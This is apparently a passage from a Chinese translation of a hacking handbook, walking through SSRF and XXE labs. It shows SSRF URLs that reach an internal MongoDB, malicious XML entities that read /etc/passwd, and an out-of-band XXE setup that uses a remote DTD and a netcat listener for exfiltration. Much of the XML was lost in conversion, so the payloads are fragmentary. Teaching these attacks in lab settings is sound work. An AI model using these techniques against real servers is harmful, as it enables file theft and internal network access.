![](3-40.png){.calibre11}
![](3-41.png){.calibre11}
你将看到端口28017的响应长度远大于所有其他请求。如果我们打开浏览器并转到：[http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017](http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} ，我们应该能够利用我们的
SSRF 并获得对 MongoDB Web 界面的访问权限。
![](3-42.png){.calibre11}
你应该能够访问所有链接，但你必须记住你需要使用 SSRF。要访问
serverStatus(
[http://chat:3000/serverStatus?text=1](http://chat:3000/serverStatus?text=1){.pcalibre2
.calibre9 .pcalibre .pcalibre1 target="_blank"} )，你必须使用 SSRF
攻击并转到此处：
-   [http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017/serverStatus?text=1](http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017/serverStatus?text=1){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
    ![](3-43.png){.calibre11}
服务器端请求伪造可能非常危险。虽然不是新的漏洞，但目前发现的 SSRF
漏洞数量越来越多。由于 SSRF
允许在基础设施内进行移动，这通常会导致某些重要的发现。
其他资源：
-   本地的很多编码：
    -   [http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf](http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf){.pcalibre2
        .calibre9 .pcalibre .pcalibre1 target="_blank"}
-   Bug Bounty - AirBNB
    -   示例：[http://bit.ly/2ELvJxp](http://bit.ly/2ELvJxp){.pcalibre2
        .calibre9 .pcalibre .pcalibre1 target="_blank"}
### XML 外部实体攻击（XXE） {#3_the_throw_web_application_exploitation.html#xml-外部实体攻击（xxe） .calibre15}
XML 代表可扩展标记语言，旨在发送/存储易于阅读的数据。 XML eXternal
Entities（XXE）是对应用程序中 XML 解析器的攻击。XML
解析常见于允许文件上传，解析 Office 文档，JSON 数据甚至 Flash
类型游戏的应用程序中。当允许 XML
解析时，不正确的验证可以授予攻击者读取文件的权限、导致拒绝服务攻击，甚至远程代码执行。从一个比较高的维度来看，应用程序具有以下需求：1)
解析用户提供的 XML 数据，2)
实体的系统标识符部分必须在文档类型声明(DTD)内，3) XML处理器必须验证/处理
DTD 并解析外部实体。
  普通 XML 文件                                                        恶意 XML 文件
  -------------------------------------------------------------------- ----------------------------------------------------------
  \\\                  \\\
  \\``{=html}``{=html}                  \\\`{=html}Book\\\``{=html}   \\\`{=html}THP\\``{=html}             \\\"file:///etc/passwd\"\>
  \\``{=html}100\\``{=html}                 \]\>
  \\\                                                          \\``{=html}&xxe;\\``{=html}
上面，我们有一个普通的 XML 文件和一个专门用来从系统的
`/etc/passwd`{.calibre14 .pcalibre4 .pcalibre3} 文件中读取文件的恶意
XML。我们将看看是否可以在真实的 XML 请求中注入恶意 XML 请求。
**XXE 实验：**
由于自定义配置请求，有一个不同的 VMWare 虚拟机用于 XXE
攻击。这可以在这里找到：
-   [http://thehackerplaybook.com/get.php?type=XXE-vm](http://thehackerplaybook.com/get.php?type=XXE-vm){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
下载后，在 VMWare
中打开虚拟机并启动它。在登录屏幕上，你无需登录，但你应该看到系统的 IP
地址。
转到浏览器：
-   通过 Burp Suite 代理所有流量
-   转到 URL：[http://\[IP](http://%5BIP){.pcalibre2 .calibre9 .pcalibre
    .pcalibre1 target="_blank"} of your Virtual Machine\]
-   拦截流量并点击 `Hack the XML`{.calibre14 .pcalibre4 .pcalibre3}
如果在加载页面后查看页面的 HTML 源代码，你可以看到有一个通过 POST
请求提交的隐藏字段。XML 内容如下所示：
``` calibre21
]>
 Hack The &book;
```
在这个例子中，我们指定它是 XML 1.0版本，DOCTYPE，指定根元素是
thp，`!ELEMENT`{.calibre14 .pcalibre4 .pcalibre3} 指定任何类型，并且
`!ENTITY`{.calibre14 .pcalibre4 .pcalibre3} 将 book
变量设置为"Universe"字符串。最后，在我们的 XML 输出中，我们希望从解析
XML 文件中打印出我们的实体。
这通常是你在发送 XML 数据的应用程序中看到的内容。由于我们控制具有 XML
请求的 POST
数据，因此我们可以尝试注入我们自己的恶意实体。默认情况下，大多数 XML
解析库都支持 SYSTEM 关键字，该关键字允许从 URI 读取数据(包括使用
`file://`{.calibre14 .pcalibre4 .pcalibre3} 协议
)。因此，我们可以创建自己的实体来制作在 `/etc/passwd`{.calibre14
.pcalibre4 .pcalibre3} 上读取的文件。
  原始 XML 文件                                                         恶意 XML 文件
  --------------------------------------------------------------------- --------------------------------------------------------------------
  \\\                                          \\\
  \\\                                                \\\
  \\\                                       \\\
  \]\>                                                                  \]\>
  \\``{=html}Hack The & book;\\``{=html}   \\``{=html}Hack The &book;\\``{=html}
**XXE 实验------阅读文件：**
-   拦截 \[你的 VM 的 IP\]/xxe.php 的流量包并点击
    `Hack of XML`{.calibre14 .pcalibre4 .pcalibre3}
-   将截获的流量包发送到 Repeater
-   将"data"的 POST 参数修改为以下内容：
    -   \ \
        \\]\>``{=html}Hack The
        %26book%3B ``{=html}
-   请注意，`%26`{.calibre14 .pcalibre4 .pcalibre3} 等同于`&`{.calibre14
    .pcalibre4 .pcalibre3}，`%3B`{.calibre14 .pcalibre4
    .pcalibre3}等同于 `;`{.calibre14 .pcalibre4
    .pcalibre3}。我们需要对&符号和分号字符进行百分比编码。
-   发送流量包，我们现在应该能够读取 `/etc/passwd`{.calibre14 .pcalibre4
    .pcalibre3}
    ![](3-44.png){.calibre11}
### 高级 XXE------XXE-OOB {#3_the_throw_web_application_exploitation.html#高级-xxe——xxe-oob .calibre15}
在之前的攻击中，我们能够在``{.calibre14 .pcalibre4
.pcalibre3}标签中获得返回的响应。那么如果我们看不到响应或遇到字符或文件限制怎么办？我们怎样使用带外数据协议（OOB）来发送我们的数据？我们可以提供远程文档类型定义（DTD）文件来执行
OOB-XXE，而不是在请求 payload 中定义我们的攻击。DTD 是结构良好的 XML
文件，用于定义 XML 文档的结构和法律元素及属性。为了简单起见，我们的 DTD
将包含我们所有的攻击或 exfil
payload，这将帮助我们解决许多字符的限制。在我们的实验示例中，我们将使有
XXE 漏洞的服务器请求一个托管在远程服务器上的 DTD。
新的 XXE 攻击将分四个阶段进行：
1.  使用篡改后的 XXE XML 攻击
2.  对于存在漏洞的 XML 解析器，它会从攻击者服务器抓取一个 DTD 文件
3.  该 DTD 文件包含读取 /etc/passwd 文件的代码
4.  该 DTD文件也包含用于隐秘传输 /etc/passwd
    内容的代码（可能是经过编码的）
设置我们的攻击者机器和 XXE-OOB payload：
-   我们将指定一个外部 DTD 文件，而不是原始文件读取
    ``` calibre21
     %dtd;
    ```
-   新的"数据"POST payload 将如下所示（记得更改 \[Your_IP\]）：
    ``` calibre21
     %dtd;]>%26send%3B
    ```
-   我们需要通过创建名为 payload.dtd 的文件在攻击者服务器上托管此
    payload
    -   gedit /var/www/html/payload.dtd
        ``` calibre21
        ">
        %all;
        ```
-   你刚刚创建的 DTD 文件指示易受攻击的服务器读取
    `/etc/ passwd`{.calibre14 .pcalibre4 .pcalibre3}
    然后尝试使用我们的敏感数据向我们的攻击者机器发出 Web
    请求。为了确保我们收到响应，我们需要启动 Web 服务器来托管 DTD
    文件并设置 NetCat 监听器
    -   nc -l -p 8888
-   你将遇到"检测到实体引用循环"类型的错误,具体的报错内容大概是："Detected
    an entity reference loop in \\**/var/www/html/xxe.php** on line
    \\**20\"。在进行 XXE 攻击时，通常会遇到解析器错误。很多时候，XXE
    解析器仅仅允许某些字符，因此读取带有特殊字符的文件会报错。我们可以做些什么来解决这个问题？在使用
    PHP 的情况下，我们可以使用 PHP 输入和输出流（
    [http://php.net/manual/en/wrappers.php.php](http://php.net/manual/en/wrappers.php.php){.pcalibre2
    .calibre9 .pcalibre .pcalibre1 target="_blank"}
    ）来读取本地文件，并使用
    `php://filter/read=convert.base64-encode`{.calibre14 .pcalibre4
    .pcalibre3} 对它们进行 base64 编码。让我们重启我们的 NetCat
    监听器并更改我们的 payload.dtd 文件以使用此功能：**